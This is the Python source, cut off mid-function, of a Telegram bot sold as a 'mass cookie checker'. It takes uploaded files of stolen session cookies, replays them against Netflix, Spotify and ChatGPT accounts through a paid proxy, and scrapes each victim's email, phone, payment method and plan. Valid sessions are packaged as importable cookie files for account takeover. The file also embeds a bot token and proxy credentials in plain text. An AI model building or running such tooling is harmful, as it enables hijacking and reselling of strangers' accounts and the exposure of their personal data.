# ================== Coo.py (patched) ==================
import os
import re
import json
import logging
import requests
import io
import zipfile
import hashlib
import tempfile
import time
import asyncio
from collections import OrderedDict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from telegram.error import BadRequest
import codecs
import html
import random
from collections import defaultdict

START_MSG = (
    "<code>\n"
    " █ MASS COOKIE CHECKER █\n\n"
    "[ Step 1 ] Choose a mode below\n"
    "[ Step 2 ] Upload .txt/.json/.zip file with cookies\n"
    "[ Step 3 ] Press \"Start Checking\"\n"
    "[ Step 4 ] Get results: All hits in ZIP at the end\n"
    "</code>"
    "<a href=\"https://t.me/S4J4G\">‎ </a>"
)
MODE_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("Spotify", callback_data="mode_spotify"),
     InlineKeyboardButton("Netflix", callback_data="mode_netflix"),
     InlineKeyboardButton("ChatGPT", callback_data="mode_chatgpt")]
])


TOKEN = "8180753707:AAE3ByLRLuT7VRrt3UL8TiF0DHWi0D7u5a8"
ADMIN_CHANNEL = -1002594117569

# --- NEW CONSTANTS & PREMIUM DATA ---
OWNER_ID = 6177293322
DEFAULT_PREMIUM_PROXY = "ps-pro.porterproxies.com:31112:PP_9BX6SW23L0:ylbz8043_country-us_session-Tp41ryDQrUzZ"
PREMIUM_DATA_FILE = "premium_data.json"

MAX_WORKERS_PER_USER = 16
BATCH_SIZE = 8
dot_length = 5
MAX_LIVE_HITS = 10

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# -------------------- PREMIUM STORAGE --------------------
class PremiumStore:
    def __init__(self, path: str):
        self.path = path
        self.lock = asyncio.Lock()
        self.data = {"premium_users": [], "premium_proxy": DEFAULT_PREMIUM_PROXY,
                     "stats": {}}
        self.load()

    def load(self):
        if os.path.exists(self.path):
            try:
                with open(self.path) as f:
                    loaded = json.load(f)
                    self.data.update(loaded)
            except Exception:
                log.exception("Failed to load premium data")
        # Ensure sets/lists
        self.data["premium_users"] = set(self.data.get("premium_users", []))
        self.data["stats"] = defaultdict(dict, self.data.get("stats", {}))

    async def save(self):
        async with self.lock:
            to_save = {
                "premium_users": list(self.data["premium_users"]),
                "premium_proxy": self.data["premium_proxy"],
                "stats": self.data["stats"]
            }
            with open(self.path, "w") as f:
                json.dump(to_save, f, indent=2)

    def is_premium(self, uid: int) -> bool:
        return uid == OWNER_ID or uid in self.data["premium_users"]

    def get_proxy(self) -> str:
        return self.data["premium_proxy"]

    async def add_premium(self, uid: int):
        self.data["premium_users"].add(uid)
        await self.save()

    async def remove_premium(self, uid: int):
        self.data["premium_users"].discard(uid)
        await self.save()

    async def set_proxy(self, proxy: str):
        self.data["premium_proxy"] = proxy
        await self.save()

    def record_stats(self, uid: int, checked: int, hits: int, fails: int):
        now = time.time()
        st = self.data["stats"].setdefault(str(uid), {})
        st["cookies_checked"] = st.get("cookies_checked", 0) + checked
        st["hits"] = st.get("hits", 0) + hits
        st["fails"] = st.get("fails", 0) + fails
        st["last_seen_ts"] = now

store = PremiumStore(PREMIUM_DATA_FILE)
from collections import defaultdict

# -------------------- PII HELPERS --------------------
EMAIL_RE = re.compile(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})')
PHONE_RE = re.compile(r'(\+?\d{2})\d{2,}(\d{2})')

def scrub_email(m):
    return f"{m.group(1)}***{m.group(2)}"

def scrub_phone(m):
    return f"{m.group(1)}******{m.group(2)}"

def scrub_text(text: str) -> str:
    text = EMAIL_RE.sub(scrub_email, text)
    text = PHONE_RE.sub(scrub_phone, text)
    return text

# -------------------- LOCKS --------------------
user_locks = defaultdict(asyncio.Lock)

# -------------------- EXISTING STATE --------------------
user_state = {}
user_executors = {}
user_tasks = {}

# -------------------- EXISTING FUNCTIONS --------------------
# (unmodified checkers, parse_cookie_file, safe_filename, dict_to_netscape...)

def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def detect_cookie_platform(text):
    text_lower = text.lower()
    platforms = set()
    if 'netflixid' in text_lower or 'securenetflixid' in text_lower:
        platforms.add('netflix')
    if '.chatgpt.com' in text_lower or any(k in text_lower for k in ['session-token', 'oai-did', 'next-auth']):
        platforms.add('chatgpt')
    if 'sp_dc' in text_lower or 'sp_key' in text_lower or 'spotify' in text_lower:
        platforms.add('spotify')
    return list(platforms)

def infer_from_cookie_dict(d):
    keys = {k.lower() for k in d}
    if {"netflixid", "securenetflixid"} & keys:
        return "netflix"
    if {"sp_dc", "sp_key"} & keys:
        return "spotify"
    if any("session" in k and "token" in k for k in keys) or {"oai-did", "next-auth.session-token"} & keys:
        return "chatgpt"
    return None

def parse_cookie_file(text):
    # kept identical
    text = text.strip()
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                return [("json_block", obj)]
            elif isinstance(obj, list):
                out = []
                for idx, cookie in enumerate(obj):
                    if isinstance(cookie, dict):
                        if "name" in cookie and "value" in cookie:
                            out.append((f"json_{idx}", {cookie["name"]: cookie["value"]}))
                        elif "key" in cookie and "value" in cookie:
                            out.append((f"json_{idx}", {cookie["key"]: cookie["value"]}))
                        else:
                            out.append((f"json_{idx}", cookie))
                if out:
                    return out
    except Exception:
        pass

    lines = [line.strip() for line in text.splitlines() if line.strip() and not line.strip().startswith("#")]
    blocks = []
    block = []
    for line in lines:
        if (
            re.match(r"^(– |-)email:", line, re.I) or
            re.match(r"^(name|plan|created|renew|cookies|valid cookies|http)", line, re.I) or
            not line
        ):
            if block:
                blocks.append(block)
                block = []
            continue
        if "=" in line and not line.startswith("#") and ";" not in line and not line.lower().startswith("path="):
            blocks.append([line])
            continue
        block.append(line)
    if block:
        blocks.append(block)

    out = []

    for idx, block in enumerate(blocks):
        netscape = {}
        netscape_lines = 0
        for line in block:
            parts = line.split()
            if len(parts) >= 7:
                try:
                    name = parts[5]
                    value = parts[6]
                    netscape[name] = value
                    netscape_lines += 1
                except Exception:
                    continue
        if netscape_lines > 0:
            out.append((f"block_{idx}_netscape", netscape))
            continue

        for line in block:
            if ";" in line and "=" in line:
                cookie = {}
                for c in line.split(";"):
                    c = c.strip()
                    if "=" in c:
                        k, v = c.split("=", 1)
                        cookie[k.strip()] = v.strip()
                if cookie:
                    out.append((f"block_{idx}_semicolon", cookie))

        for line in block:
            if "=" in line and not line.startswith("#") and ";" not in line:
                k, v = line.split("=", 1)
                if any(x in k.lower() for x in ["session", "token", "netflixid", "securenetflixid", "sp_dc", "sp_key", "oai-did"]):
                    out.append((f"block_{idx}_{k.strip()}", {k.strip(): v.strip()}))
                elif len(v.strip()) > 20:
                    out.append((f"block_{idx}_{k.strip()}", {k.strip(): v.strip()}))

        cookie = {}
        for line in block:
            for m in re.finditer(r"([A-Za-z0-9_\-\.@]+)=([^\s;]+)", line):
                k, v = m.group(1), m.group(2)
                cookie[k] = v
        if cookie:
            out.append((f"block_{idx}_allkeys", cookie))

    for m in re.finditer(r"([A-Za-z0-9_\-\.@]*session[^=]{0,30})=([^\s;]+)", text, re.I):
        k, v = m.group(1), m.group(2)
        out.append((f"hidden_{k}", {k: v}))

    seen = set()
    unique_out = []
    for name, d in out:
        ser = json.dumps(d, sort_keys=True)
        if ser not in seen:
            unique_out.append((name, d))
            seen.add(ser)
    return unique_out

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir():
                continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (blockname, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except Exception:
                        log.exception("zip extract error")
                        continue
    return cookies

# --- unchanged checkers below ---
def check_netflix_cookie(cookie_dict):
    # unchanged
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'}
    try:
        resp = session.get(url, headers=headers, timeout=25)
        txt = resp.text

        def find(pattern):
            m = re.search(pattern, txt)
            return m.group(1) if m else None

        plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"')
        if not plan:
            plan = find(r'"planName"\s*:\s*"([^"]+)"')
        if plan:
            plan = plan.replace("\\x20", " ").replace("\\x28", " ").replace("\\x29", " ").replace("\\u0020", " ")
            plan = unescape_plan(plan)
        else:
            plan = "Unknown"

        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
        if plan_price:
            plan_price = unescape_plan(plan_price)
        else:
            plan_price = "Unknown"

        member_since = find(r'"memberSince":"([^"]+)"')
        if member_since:
            member_since = unescape_plan(member_since)
        else:
            member_since = "Unknown"

        payment_method = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
        if not payment_method:
            payment_method = "Unknown"

        phone = find(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"')
        if phone:
            phone = phone.replace("\\x2B", "+")
        else:
            phone = "Unknown"

        phone_verified = find(r'"growthPhoneNumber":\{"__typename":"GrowthPhoneNumber","isVerified":(true|false)')
        if phone_verified:
            phone_verified = "Yes" if phone_verified == "true" else "No"
        else:
            phone_verified = "Unknown"

        video_quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
        if not video_quality:
            video_quality = "Unknown"

        max_streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
        if not max_streams:
            max_streams = "Unknown"

        payment_hold = find(r'"growthHoldMetadata":\{"__typename":"GrowthHoldMetadata","isUserOnHold":(true|false)')
        if payment_hold:
            payment_hold = "Yes" if payment_hold == "true" else "No"
        else:
            payment_hold = "Unknown"

        extra_member = find(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)')
        if extra_member:
            extra_member = "Yes" if extra_member == "true" else "No"
        else:
            extra_member = "Unknown"

        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
        profiles = []
        try:
            resp_profiles = session.get("https://www.netflix.com/ManageProfiles", timeout=15)
            profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', resp_profiles.text)
            if not profiles:
                profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', resp_profiles.text)
        except Exception:
            pass
        profiles_str = ", ".join(profiles) if profiles else "Unknown"

        status = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status and status.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status)
        if not is_valid and "NetflixId" in cookie_dict and "SecureNetflixId" not in cookie_dict:
            is_valid = "Account & Billing" in txt or 'membershipStatus' in txt
            is_premium = is_valid

        return {
            'ok': is_valid,
            'premium': is_premium,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'member_since': member_since,
            'payment_method': payment_method,
            'phone': phone,
            'phone_verified': phone_verified,
            'video_quality': video_quality,
            'max_streams': max_streams,
            'on_payment_hold': payment_hold,
            'extra_member': extra_member,
            'email_verified': email_verified,
            'email': email,
            'profiles': profiles_str,
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def check_spotify_cookie(cookie_dict):
    try:
        session = requests.Session()
        session.cookies.update(cookie_dict)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Accept": "application/json",
        }
        resp = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer", headers=headers, timeout=20)
        if resp.status_code != 200:
            return {"ok": False, "reason": "Not logged in or invalid cookie", "cookie": cookie_dict}
        data = resp.json()
        plan = data.get("currentPlan", "unknown")
        is_premium = plan.lower() != "free"
        country = data.get("country", "unknown")
        is_recurring = data.get("isRecurring", False)
        is_trial = data.get("isTrialUser", False)
        return {
            "ok": is_premium,
            "premium": is_premium,
            "plan": plan,
            "country": country,
            "recurring": is_recurring,
            "trial": is_trial,
            "cookie": cookie_dict,
            "reason": None if is_premium else "Free plan"
        }
    except Exception as e:
        return {"ok": False, "reason": str(e), "cookie": cookie_dict}

def check_chatgpt_cookie(cookie_dict):
    url = "https://chat.openai.com/api/auth/session"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json",
    }
    session = requests.Session()
    session.cookies.update(cookie_dict)
    try:
        resp = session.get(url, headers=headers, timeout=25)
        if resp.status_code == 200 and infer_from_cookie_dict(cookie_dict) == "chatgpt":
            return {
                "ok": True,
                "premium": True,
                "plan": "Unknown (Login OK)",
                "expires": "",
                "cookie": cookie_dict,
            }
        elif resp.status_code == 200:
            return {
                "ok": True,
                "premium": True,
                "plan": "Unknown (Login OK, no session-token)",
                "expires": "",
                "cookie": cookie_dict,
            }
        elif resp.status_code == 401:
            return {"ok": False, "reason": "Invalid/Expired Session (401)", "cookie": cookie_dict}
        else:
            return {"ok": False, "reason": f"Failed (status {resp.status_code})", "cookie": cookie_dict}
    except Exception as e:
        return {"ok": False, "reason": str(e), "cookie": cookie_dict}

def unescape_plan(s):
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def clean_unicode(val):
    if not isinstance(val, str):
        return val
    try:
        val = codecs.decode(val, 'unicode_escape')
    except Exception:
        pass
    try:
        val = html.unescape(val)
    except Exception:
        pass
    return val

def dict_to_netscape(cookie_dict, domain):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

# --------- owner commands ----------
async def add_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        uid = int(ctx.args[0])
    except Exception:
        await update.message.reply_text("Usage: /add <user_id>")
        return
    await store.add_premium(uid)
    await update.message.reply_text(f"Added {uid} to premium")

async def remove_premium(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        uid = int(ctx.args[0])
    except Exception:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    await store.remove_premium(uid)
    await update.message.reply_text(f"Removed {uid} from premium")

async def set_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if not ctx.args:
        await update.message.reply_text("Usage: /setproxy <host:port:user:pass>")
        return
    proxy = " ".join(ctx.args)
    try:
        # quick test
        p = proxy.split(':')
        proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        proxies = {"http": proxy_url, "https": proxy_url}
        requests.get("https://www.google.com", proxies=proxies, timeout=5)
    except Exception as e:
        await update.message.reply_text(f"Proxy test failed: {e}")
        return
    await store.set_proxy(proxy)
    await update.message.reply_text("Proxy updated and saved")

async def list_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    lines = ["<pre>User ID       Username     Checked  Hits  Fails</pre>"]
    for uid in sorted(store.data["premium_users"], key=lambda u: -store.data["stats"].get(str(u), {}).get("hits", 0)):
        st = store.data["stats"].get(str(uid), {})
        try:
            chat = await ctx.bot.get_chat(uid)
            username = chat.username or "N/A"
        except Exception:
            username = "N/A"
        lines.append(f"<pre>{uid:<12} {username:<12} {st.get('cookies_checked',0):>7} {st.get('hits',0):>5} {st.get('fails',0):>5}</pre>")
    if len(lines) == 1:
        await update.message.reply_text("No premium users")
    else:
        await update.message.reply_html("\n".join(lines))

# ------------------ handlers with locks ------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            stop_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
            ])
            await update.message.reply_html(
                "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
                reply_markup=stop_markup
            )
            return
        user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
        await update.message.reply_html(START_MSG, reply_markup=MODE_MARKUP)

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    user_id = update.effective_user.id
    async with user_locks[user_id]:
        # Ensure user_state entry exists
        if user_id not in user_state:
            user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
        if user_state[user_id].get('busy'):
            ...
            stop_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
            ])
            await update.message.reply_html(
                "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
                reply_markup=stop_markup
            )
            return
        file = await update.message.document.get_file()
        ext = update.message.document.file_name.lower()
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = os.path.join(temp_dir, update.message.document.file_name)
            await file.download_to_drive(temp_path)
            with open(temp_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            # classify cookies
            cookies = []
            if ext.endswith('.zip'):
                cookies = await extract_cookies_from_zip(temp_path)
            elif ext.endswith('.txt') or ext.endswith('.json'):
                c = parse_cookie_file(content)
                for idx, (blockname, cc) in enumerate(c):
                    cookies.append((f"{os.path.basename(temp_path)}_{idx}", cc))
            else:
                await update.message.reply_text("Unsupported file type.")
                return

            # dedup
            seen = set()
            dedup = []
            for name, ck in cookies:
                h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
                if h not in seen:
                    seen.add(h)
                    dedup.append((name, ck))
            cookies = dedup

            # bucket by inferred service
            buckets = defaultdict(list)
            for name, ck in cookies:
                svc = infer_from_cookie_dict(ck)
                if svc:
                    buckets[svc].append((name, ck))
            if not buckets:
                await update.message.reply_text("No valid cookies found.")
                return
            # choose mode if single service
            if len(buckets) == 1:
                mode = list(buckets.keys())[0]
                user_state[user_id]['mode'] = mode
                user_state[user_id]['cookies'] = buckets[mode]
                check_markup = InlineKeyboardMarkup([
                    [InlineKeyboardButton("Start Checking", callback_data="start_check")]
                ])
                await update.message.reply_html(
                    f"Loaded {len(buckets[mode])} cookie set(s) for <b>{mode.capitalize()}</b>. Press below to start.",
                    reply_markup=check_markup
                )
            else:
                # multiple modes
                buttons = [[InlineKeyboardButton(k.capitalize(), callback_data=f"switchmode_{k}")] for k in buckets]
                await update.message.reply_text(
                    f"Detected multiple services: {', '.join(buckets)}.\nSelect one to start:",
                    reply_markup=InlineKeyboardMarkup(buttons)
                )
                # store for later
                user_state[user_id]['buckets'] = buckets

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            stop_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
            ])
            try:
                await query.answer()
            except BadRequest:
                pass
            await context.bot.send_message(
                chat_id, "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
                reply_markup=stop_markup
            )
            return
        user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
        if "spotify" in query.data:
            mode = "spotify"
        elif "netflix" in query.data:
            mode = "netflix"
        else:
            mode = "chatgpt"
        user_state[user_id]['mode'] = mode
        mode_display = "ChatGPT" if mode == "chatgpt" else mode.capitalize()
        try:
            await query.answer(f"Selected {mode_display} mode!")
        except BadRequest:
            pass
        await context.bot.send_message(
            chat_id, f"<b>{mode_display} mode activated!</b>\nNow please upload your .txt/.json/.zip cookie file.",
            parse_mode='HTML'
        )

async def switchmode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            stop_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
            ])
            try:
                await query.answer()
            except BadRequest:
                pass
            await context.bot.send_message(
                chat_id,
                "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
                reply_markup=stop_markup
            )
            return
        if "spotify" in query.data:
            new_mode = "spotify"
        elif "netflix" in query.data:
            new_mode = "netflix"
        else:
            new_mode = "chatgpt"
        user_state[user_id]['mode'] = new_mode
        user_state[user_id]['stop'] = False
        user_state[user_id]['busy'] = False
        buckets = user_state[user_id].get('buckets', {})
        if new_mode in buckets:
            user_state[user_id]['cookies'] = buckets[new_mode]
        mode_display = "ChatGPT" if new_mode == "chatgpt" else new_mode.capitalize()
        try:
            await query.answer(f"Switched to {mode_display} mode!")
        except BadRequest:
            pass
        check_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Start Checking", callback_data="start_check")]
        ])
        await context.bot.send_message(
            chat_id,
            f"<b>Switched to {mode_display} mode!</b>\nLoaded {len(user_state[user_id].get('cookies', []))} cookies. Press below to start.",
            parse_mode='HTML',
            reply_markup=check_markup
        )

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    async with user_locks[user_id]:
        if user_id in user_tasks:
            user_tasks[user_id].cancel()
            user_state[user_id]['busy'] = False
            user_state[user_id]['stop'] = True
            try:
                await query.answer("Stopped and cancelled current checking task!")
            except BadRequest:
                pass
        else:
            user_state[user_id]['stop'] = True
            user_state[user_id]['busy'] = False
            try:
                await query.answer("Stopping... Please wait or restart.")
            except BadRequest:
                pass

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        cookies = user_state.get(user_id, {}).get('cookies')
        if not cookies:
            await query.answer("No cookies loaded!")
            return
        if user_state.get(user_id, {}).get('busy'):
            await query.answer("Already checking!")
            return
        user_state[user_id]['stop'] = False
        user_state[user_id]['busy'] = True
        # premium proxy
        if store.is_premium(user_id):
            user_state[user_id]['use_proxy'] = store.get_proxy()
            try:
                chat = await context.bot.get_chat(user_id)
                username = chat.username or "N/A"
            except Exception:
                username = "N/A"
            try:
                await context.bot.send_message(
                    OWNER_ID,
                    f"Premium check started\nUser: @{username} ({user_id})\nMode: {user_state[user_id]['mode']}\nCookies: {len(cookies)}"
                )
            except Exception:
                pass
        else:
            user_state[user_id]['use_proxy'] = None

        user_tasks[user_id] = context.application.create_task(
            asyncio.wait_for(process_cookies(chat_id, cookies, user_id, context), timeout=600)
        )
        await query.answer("Started checking!")

# ------------------ PROCESS COOKIES ------------------

async def get_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id

    # Use final_hits if exists, else live_hits (for mid-check)
    hits = user_state.get(user_id, {}).get('final_hits') or user_state.get(user_id, {}).get('live_hits', OrderedDict())
    if not hits:
        await query.answer("No hits found!")
        return

    mode = user_state[user_id].get('mode', 'netflix')
    if mode == "netflix":
        domain = ".netflix.com"
    elif mode == "spotify":
        domain = ".spotify.com"
    else:
        domain = ".chat.openai.com"

    all_hits = []
    for idx, (name, details_dict) in enumerate(hits.items(), 1):
        if mode == 'netflix':
            details = [
                f"Plan: {clean_unicode(details_dict.get('plan', 'Unknown'))}",
                f"Plan Price: {clean_unicode(details_dict.get('plan_price', 'Unknown'))}",
                f"Country: {clean_unicode(details_dict.get('country', 'Unknown'))}",
                f"Member Since: {clean_unicode(details_dict.get('member_since', 'Unknown'))}",
                f"Payment Method: {clean_unicode(details_dict.get('payment_method', 'Unknown'))}",
                f"Email: {clean_unicode(details_dict.get('email', 'Unknown'))}",
                f"Email Verified: {clean_unicode(details_dict.get('email_verified', 'Unknown'))}",
                f"Phone: {clean_unicode(details_dict.get('phone', 'Unknown'))}",
                f"Phone Verified: {clean_unicode(details_dict.get('phone_verified', 'Unknown'))}",
                f"Video Quality: {clean_unicode(details_dict.get('video_quality', 'Unknown'))}",
                f"Max Streams: {clean_unicode(details_dict.get('max_streams', 'Unknown'))}",
                f"On Payment Hold: {clean_unicode(details_dict.get('on_payment_hold', 'Unknown'))}",
                f"Extra Member: {clean_unicode(details_dict.get('extra_member', 'Unknown'))}",
                f"Profiles: {clean_unicode(details_dict.get('profiles', 'Unknown'))}",
            ]
        else:
            details = [
                f"Plan: {clean_unicode(details_dict.get('plan', 'Unknown'))}",
                f"Country: {clean_unicode(details_dict.get('country', 'Unknown'))}",
            ]

        cookie_dict = details_dict.get('cookie', {})
        if isinstance(cookie_dict, dict):
            netscape = dict_to_netscape(cookie_dict, domain)
        elif isinstance(cookie_dict, str):
            netscape = cookie_dict
        else:
            netscape = str(cookie_dict)

        file_content = (
            f"========== HIT #{idx} ==========\n" +
            "\n".join(details) +
            "\nNetscape Cookie ↓\n" +
            netscape
        )
        all_hits.append(file_content)

    txt_buffer = io.BytesIO(("\n\n".join(all_hits)).encode("utf-8"))
    await context.bot.send_document(
        chat_id,
        document=InputFile(txt_buffer, filename="Current_Hits.txt"),
        caption=f"Current hits as .txt file"
    )
    await query.answer(f"Sent {len(hits)} hits as txt!")




async def process_cookies(chat_id, cookies, user_id, context):
    checked, hits, fails, free = 0, 0, 0, 0
    total = len(cookies)
    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("Stop", callback_data="stop_check"),
         InlineKeyboardButton("Get Hits", callback_data="get_hits")]
    ])
    mode = user_state[user_id]['mode']
    mode_display = "ChatGPT" if mode == "chatgpt" else mode.capitalize()
    progress_msg = (
        f"<b>{mode_display} Cookie Checking</b>\n"
        f"<code>{'○'*dot_length}</code>  0/{total}\n"
        + (
            f"Hits: <b>0</b> | Fails: <b>0</b>" if mode == "chatgpt" else
            f"Hits: <b>0</b> | Free: <b>0</b> | Fails: <b>0</b>"
        )
    )
    msg = await context.bot.send_message(chat_id, progress_msg, parse_mode='HTML', reply_markup=reply_markup)
    msg_id = msg.message_id
    preview_msg = await context.bot.send_message(chat_id, "<b>Preview of hits will appear here...</b>", parse_mode='HTML')
    preview_msg_id = preview_msg.message_id

    if user_id not in user_executors:
        user_executors[user_id] = ThreadPoolExecutor(max_workers=MAX_WORKERS_PER_USER)
    executor = user_executors[user_id]

    live_hits = OrderedDict()
    user_state[user_id]['live_hits'] = live_hits
    user_state[user_id]['hits_tmp'] = tempfile.mktemp(prefix="hits_")

    # prepare proxy
    proxy = user_state[user_id].get('use_proxy')
    proxies = None
    if proxy:
        p = proxy.split(':')
        proxy_url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
        proxies = {"http": proxy_url, "https": proxy_url}

    # circuit breaker
    recent_results = []
    error_count = 0

    def run_with_proxy(fn, ck):
        session = requests.Session()
        if proxies:
            session.proxies.update(proxies)
        return fn(ck)

    def retry(fn, ck):
        for attempt in range(3):
            try:
                return run_with_proxy(fn, ck)
            except Exception as e:
                if attempt == 2:
                    raise e
                time.sleep((0.5 * (2 ** attempt)) + random.random())

    try:
        with open(user_state[user_id]['hits_tmp'], "w") as ftmp:
            for batch_start in range(0, len(cookies), BATCH_SIZE):
                batch = cookies[batch_start:batch_start+BATCH_SIZE]
                if user_state.get(user_id, {}).get('stop'):
                    break
                # circuit breaker backoff
                if len(recent_results) >= 50 and (error_count / len(recent_results)) >= 0.5:
                    await asyncio.sleep(1)
                    recent_results.clear()
                    error_count = 0

                loop = asyncio.get_running_loop()
                futures = []
                for name, cookie in batch:
                    if mode == 'spotify':
                        fut = loop.run_in_executor(executor, retry, check_spotify_cookie, cookie)
                    elif mode == 'netflix':
                        fut = loop.run_in_executor(executor, retry, check_netflix_cookie, cookie)
                    elif mode == 'chatgpt':
                        fut = loop.run_in_executor(executor, retry, check_chatgpt_cookie, cookie)
                    else:
                        fut = loop.run_in_executor(executor, lambda x: {'ok': False, 'reason': 'Unknown mode', 'cookie': x}, cookie)
                    futures.append(asyncio.wait_for(fut, timeout=15))

                try:
                    results = await asyncio.gather(*futures, return_exceptions=True)
                except asyncio.CancelledError:
                    break

                # post-stop check
                if user_state.get(user_id, {}).get('stop'):
                    break

                for i, result in enumerate(results):
                    checked += 1
                    if isinstance(result, Exception):
                        result = {'ok': False, 'reason': str(result), 'cookie': batch[i][1]}
                        error_count += 1
                    else:
                        recent_results.append(result)
                        if not result.get("ok"):
                            error_count += 1
                    if result.get("ok") and (mode != "netflix" or result.get("premium", False)):
                        hits += 1
                        live_hits[f"Hit_{hits}"] = result
                        # keep bounded
                        if len(live_hits) > MAX_LIVE_HITS:
                            live_hits.popitem(last=False)
                        user_state[user_id]['live_hits'] = live_hits
                        # write full to temp
                        ftmp.write(json.dumps(result) + "\n")
                        ftmp.flush()

                        # scrub preview
                        if mode == "netflix":
                            details = [
                                f"Plan: {scrub_text(clean_unicode(result.get('plan', 'Unknown')))}",
                                f"Plan Price: {scrub_text(clean_unicode(result.get('plan_price', 'Unknown')))}",
                                f"Country: {scrub_text(clean_unicode(result.get('country', 'Unknown')))}",
                                f"Member Since: {scrub_text(clean_unicode(result.get('member_since', 'Unknown')))}",
                                f"Payment Method: {scrub_text(clean_unicode(result.get('payment_method', 'Unknown')))}",
                                f"Email: {scrub_text(clean_unicode(result.get('email', 'Unknown')))}",
